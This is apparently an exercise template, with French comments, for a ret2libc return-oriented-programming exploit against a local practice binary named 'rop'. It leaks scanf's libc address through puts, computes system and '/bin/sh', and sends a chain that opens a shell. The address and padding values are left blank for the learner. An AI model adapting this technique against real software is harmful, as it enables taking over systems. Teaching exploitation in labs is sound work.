#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *


context(arch='i386')
p = 0
b = ELF('./rop')
libc = ELF('/lib32/libc.so.6') # "info sharedlibrary" sous gdb pour connaître le chemin de votre libc

DEBUG = False

def wait(until):
    buf=p.recvuntil(until)
    if(DEBUG):
        print buf
    return buf

def start():
    global p, libc, b
    if p is not 0:
        p.close()
    p = process('./rop')
    wait("Input:")

# Modifier les address ici afin que vous ayez le leak des de l'addresse de scanf
addrmain =  # main
gadget =  # Gadget
gotscanf = # scanf
pltputs =  # puts@plt 
padding= "A"*  # Padding

start()
log.info("Construct ropchain")
ropchain=padding+p32(pltputs)+p32(gadget)+p32(gotscanf)+p32(addrmain)
log.info("Get scanf leak")
p.sendline(ropchain)

leak=wait('Input:')
leak_scanf = u32(leak[2:6])

# Trouver les addresses dans la libc /lib32/libc.so.6
libcScanf = # scanf()
libcSystem = # system()
libcBinSh = # /bin/sh

# Base de l'addresses de la libc 
offset = leak_scanf - 

# Adresses de la fonction system
system = offset + 

# Adresse de la string "/bin/sh"
binsh = offset + 


log.info("Leak got scanf: "+str(hex(leak_scanf)))
log.info("Leak system: "+str(hex(system)))
log.info("Leak /bin/sh: "+str(hex(binsh)))

log.info("Get shell")
ropchain=padding+p32(system)+p32(gadget)+p32(binsh)
p.sendline(ropchain)

# Interactive shell
p.interactive()